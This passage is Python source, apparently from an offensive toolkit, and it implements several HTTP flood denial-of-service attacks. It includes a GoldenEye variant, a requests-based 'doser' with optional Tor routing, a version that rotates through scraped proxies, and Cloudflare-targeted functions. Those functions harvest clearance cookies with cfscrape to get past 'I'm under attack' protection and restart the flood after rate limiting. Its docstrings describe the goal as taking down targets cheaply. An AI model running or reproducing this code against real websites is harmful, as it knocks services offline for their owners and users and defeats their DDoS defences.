       jo='?' 
      pa+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': self.target}
      conn.request("GET",pa,headers=h)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      params =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(300,500))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': self.target}
      conn.request("POST", pa, params, headers)
    if stop==True:
        break
    goldeneye_counter+=1
    if self.logs==True:
        sys.stdout.write("\rRequests: {} | Type: {}  ".format(goldeneye_counter,req))
        sys.stdout.flush()
        #print("Requests: {} | Type: {}".format(goldeneye_counter,req))
   except Exception as e:
    pass
   time.sleep(.1)
  self.target=None
  self.port=None
  self.method=None
  self.timeout=None
def goldeneye(u,p=80,threads=700,flood_method=3,timeout=5,duration=60,logs=True,returning=False):
 '''
   this function is for goldeneye attack with more effective method that take down the targets and doesn't consume much of your resources! thr reason that the original script pushs too much on your device is the fact that it fabricate he useragents string, random ascii blocks and the http headers on its own for every single request at the same time, so as much as you use more threads it's going to use more of your resources. here i already provided it with more than 10k unique useragents outside all clases (no need to redeclare it inside the class' functions everytime and push on the memory) and just formating the values of the http headers and the ascii strings.

   it takes the same parameters as the other, but with extra one:

   meth: (set by default to: 1) you can choos the type of http flood you wantby setting it betweeen 1 and 3:
   1=>GET
   2=>POST
   3=>randomly: GET & POST

'''
 thr=[]
 global goldeneye_counter
 goldeneye_counter=0
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global method
 method=flood_method#1: GET / 2: POST / 3:GET & POST
 global port 
 port=p
 global _timeout
 _timeout=timeout
 for x in range(threads):
  try:
   t=gldn()
   t.start()
   thr.append(t)
  except:
    pass
 c=time.time()  
 while True:
  if stop==True:
     break
  try:
   time.sleep(.1)
   if int(time.time()-c)==duration:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if logs==True:
     print("[*]Killing all threads...")
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
 if logs==True:
     print("[*]Done!")
 if returning==True:
    return goldeneye_counter
class dosecl(threading.Thread):
 def run(self):
  global doser_counter
  self.target=target
  u=self.target
  self.timeout=_timeout
  self.method=method
  self.tor=tor
  host=u.split('://')[1].split('/')[0]
  time.sleep(2)
  while (stop!=True):
   u=self.target
   try:
    if self.method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
     if self.tor==True:
       session = requests.session()
       session.proxies = {}
       session.proxies['http'] = 'socks5h://localhost:9050'
       session.proxies['https'] = 'socks5h://localhost:9050'
       session.get(u,headers=h,timeout=self.timeout, verify=False)
     else:
       requests.get(u,headers=h,timeout=self.timeout, verify=False)
    elif self.method==2:
      req="POST"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)+str(random.randint(1,10000))
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)+str(random.randint(1,10000))
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': host}
      if self.tor==True:
       session = requests.session()
       session.proxies = {}
       session.proxies['http'] = 'socks5h://localhost:9050'
       session.proxies['https'] = 'socks5h://localhost:9050'
       session.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
      else:
       requests.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
    elif self.method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
      if self.tor==True:
       session = requests.session()
       session.proxies = {}
       session.proxies['http'] = 'socks5h://localhost:9050'
       session.proxies['https'] = 'socks5h://localhost:9050'
       session.get(u,headers=h,timeout=self.timeout, verify=False)
      else:
       requests.get(u,headers=h,timeout=self.timeout, verify=False)
     else:
      req="POST"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      if self.tor==True:
       session = requests.session()
       session.proxies = {}
       session.proxies['http'] = 'socks5h://localhost:9050'
       session.proxies['https'] = 'socks5h://localhost:9050'
       session.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
      else:
       requests.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
    if stop==True:
        break
    doser_counter+=1
    if self.logs==True:
        sys.stdout.write("\rRequests: {} | Type: {}  ".format(doser_counter,req))
        sys.stdout.flush()
        #print("Requests: {} | Type: {}".format(doser_counter,req))
   except requests.exceptions.ReadTimeout:
    if stop==True:
        break
    doser_counter+=1
    if self.logs==True:
        sys.stdout.write("\rRequests: {} | Type: {}  ".format(doser_counter,req))
        sys.stdout.flush()
        #print("Requests: {} | Type: {}  ".format(doser_counter,req))
   except Exception as e:
    pass
   time.sleep(.1)
  self.target=None
  u=None
  self.timeout=None
  self.method=None
  self.tor=None
  host=None
def doser(u,threads=700,flood_method=1,timeout=5,duration=60,logs=True,returning=False,set_tor=False):
 '''
  this function is for doser.py attack tool which uses requests module instead of httplib.
'''
 thr=[]
 global doser_counter
 doser_counter=0
 global tor
 tor=set_tor
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global method
 method=flood_method
 global _timeout
 _timeout=timeout
 for x in range(threads):
  try:
   t=dosecl()
   t.start() 
   thr.append(t)
  except:
    pass
 c=time.time()
 while True:
  if stop==True:
     break
  try:
   time.sleep(.1)
   if int(time.time()-c)==duration:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if logs==True:
     print("[*]Killing all threads...")
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
 if logs==True:
     print("[*]Done!")
 if returning==True:
    return doser_counter
class prdose(threading.Thread):
 def run(self):
  global proxdoser_counter 
  self.target=target
  u=self.target
  self.timeout=_timeout
  self.method=method
  host=u.split('://')[1].split('/')[0]
  time.sleep(2)
  while (stop!=True):
   pr="http://"+random.choice(httplist)
   proxy={'http':pr,'https':pr}
   u=self.target
   try:
    if self.method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
     requests.get(u,headers=h,proxies=proxy,timeout=self.timeout, verify=False)
    elif self.method==2:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)+str(random.randint(1,10000))
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)+str(random.randint(1,10000))
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': host}
      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=self.timeout, verify=False)
    elif self.method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
      requests.get(u,headers=h,proxies=proxy,timeout=self.timeout, verify=False)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': host}
      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=self.timeout, verify=False)
    if stop==True:
        break
    proxdoser_counter+=1
    if self.logs==True:
        sys.stdout.write("\rRequests: {} | Type: {} | Bot: {}  ".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
        sys.stdout.flush()
        #print("Requests: {} | Type: {} | Bot: {}".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
   except requests.exceptions.ReadTimeout:
    if stop==True:
        break
    proxdoser_counter+=1
    if self.logs==True:
        sys.stdout.write("\rRequests: {} | Type: {} | Bot: {}  ".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
        sys.stdout.flush()
   except Exception as e:
    pass
   time.sleep(.1)
  self.target=None
  u=None
  self.timeout=None
  self.method=None
  host=None
def prox_doser(u,scraping_timeout=15,threads=700,http_list=None,flood_method=1,timeout=5,duration=60,logs=True,returning=False):
 '''
   this is the advanced version of doser.py using http proxies.
'''
 thr=[]
 global proxdoser_counter
 proxdoser_counter=0
 global stop
 stop=False
 
 self.logs=logs
 global target
 target=u
 global method
 method=flood_method
 global httplist
 if http_list:
  httplist=http_list
 else:
  httplist=masshttp(timeout=scraping_timeout)
 global _timeout
 _timeout=timeout
 for x in range(threads):
  try:
   t=prdose()
   t.start()
   thr.append(t)
  except:
    pass
 c=time.time()
 while True:
  if stop==True:
     break
  try:
   time.sleep(.1)
   if int(time.time()-c)==duration:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if logs==True:
     print("[*]Killing all threads...")
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
 if logs==True:
     print("[*]Done!")
 if returning==True:
    return proxdoser_counter
class atcf(threading.Thread):
 def run(self):
  global cf_doser_counter
  global stop
  self.target=target
  self.timeout=_timeout
  time.sleep(2)
  while (stop!=True):
     u=random.choice(paths)
     q=''
     for i in range(random.randint(2,5)):
      q+=random.choice(lis)+str(random.randint(1,100000))
     s=''
     for i in range(random.randint(2,5)):
      s+=random.choice(lis)+str(random.randint(1,100000))
     p=''
     for i in range(random.randint(2,5)):
      p+=random.choice(lis)+str(random.randint(1,100000))
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+s
     request = urllib2.Request('http://'+self.target+u)
     a=random.choice(ual)
     if coo==True:
      b=a.split(':')[0]
      c=a.split(':')[1]
      request.add_header('User-Agent', b)
      request.add_header('Cookie', c)
     else:
      request.add_header('User-Agent', random.choice(ua2))
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept',random.choice(a))
     request.add_header('Accept-Language',random.choice(al))
     request.add_header('Accept-Encoding',random.choice(ec))
     request.add_header('Accept-Charset', random.choice(ac))
     request.add_header('Referer', random.choice(referers) +p)
     request.add_header('Keep-Alive', random.randint(100,500))
     request.add_header('Connection', 'keep-alive')
     request.add_header('Host',self.target)
     try:
      req=urllib2.urlopen(request,timeout=self.timeout)            
      cf_doser_counter+=1
      if self.logs==True:
        sys.stdout.write("\rRequests: {}".format(cf_doser_counter))
        sys.stdout.flush()
        #print("Requests: {}".format(cf_doser_counter))
     except urllib2.HTTPError as ex:
      if "Too Many Requests" in str(ex):
       stop=True
       break
      cf_doser_counter+=1
      if self.logs==True:
        sys.stdout.write("\rRequests: {}".format(cf_doser_counter))
        sys.stdout.flush()
        #print("Requests: {}".format(cf_doser_counter))
     except Exception as e:
      if "The read operation timed out" in str(e):
       cf_doser_counter+=1
       if self.logs==True:
        sys.stdout.write("\rRequests: {}".format(cf_doser_counter))
        sys.stdout.flush()
        #print("Requests: {}".format(cf_doser_counter))
  self.target=None
  self.timeout=None
class cooi(threading.Thread):
 def run(self):
  global ier
  global ual
  x=flag
  self.target=target
  us=ue[x]
  try:
   s = cfscrape.create_scraper()
   c = s.get_cookie_string("http://"+self.target,user_agent=us)
   c= str(c).split("'")[1].split("'")[0]
   ual.append(us+':'+c)
  except:
   pass
  self.target=None
  us=None
  x=None
  ier+=1
def cki(logs=False):
 thr=[]
 global flag
 flag=-1
 global ier
 ier=0
 if logs==True:
  print("[+]Getting yummy hot cookies...")
 for x in range(10):
  flag+=1
  try:
   thr.append(cooi().start())
  except:
    pass
  time.sleep(.01)
 while(ier!=10):
   time.sleep(.1)
 time.sleep(1)
 if logs==True:
     print("[*]Killing all threads...")
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
 if logs==True:
     print("[*]Done!")
def cf_kill_ua(u,threads=500,timeout=5,check_ua_protection=True,need_cookie=False,duration=60,logs=True,returning=False):
 thr=[]
 global cf_doser_counter
 cf_doser_counter=0
 
 global stop
 stop=False
 self.logs=logs
 global _timeout
 _timeout=timeout
 global target
 target=u
 global ual
 global ue
 for x in ua2:
  x+=str(random.randint(1,1000000)*random.randint(1,1000000))+str(random.randint(1,1000000)*random.randint(1,1000000))+str(random.randint(1,1000000)*random.randint(1,1000000))
  ue.append(x)
 global coo
 coo=need_cookie
 if check_ua_protection==True:
  try:
   print("[*]Checking for 'I m under attack protection...")
   r=requests.get("https://"+u)
   if ((r.status_code==503) or ('Checking your browser before accessing' in r.text)):
    coo=True
  except Exception as e:
   print (e)
   return None
  if coo==True:
   print("I'm under attack protection: On")
  else:
   print("I'm under attack protection: Off")
 if coo==True:
  cki(logs=logs)
 else:
  ual=ue[:]
 for x in range(threads):
  try:
   thr.append(atcf().start())
   time.sleep(.001)
  except:
    pass
 c=time.time()
 while True:
  if stop==True:
     break
  try:
   time.sleep(.1)
   if int(time.time()-c)==duration:
    stop=True
    break
  except KeyboardInterrupt:
   stop=True
   break
 if logs==True:
     print("[*]Killing all threads...")
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
 if logs==True:
     print("[*]Done!")
 if returning==True:
    return cf_doser_counter
def cf_kill_ua_rate_limiting(u,threads=500,timeout=5,duration=60,logs=True,returning=False,wait=10):
 global cf_doser_counter
 cf_doser_counter=0
 c=time.time()
 global stop
 while True:
  try:
   cf_kill_ua(u,threads=threads,duration=(duration-int(time.time()-c)),timeout=timeout,need_cookie=True,check_ua_protection=False)
   time.sleep(3)
   if logs==True:
    print("[*]Resarting the attack after {} seconds...".format(wait))
   time.sleep(wait)  
   reset() 
   if int(time.time()-c)==duration:
    stop=True
    break
  except KeyboardInterrupt:
    stop=True
    break
 if returning==True:
    return cf_doser_counter
"""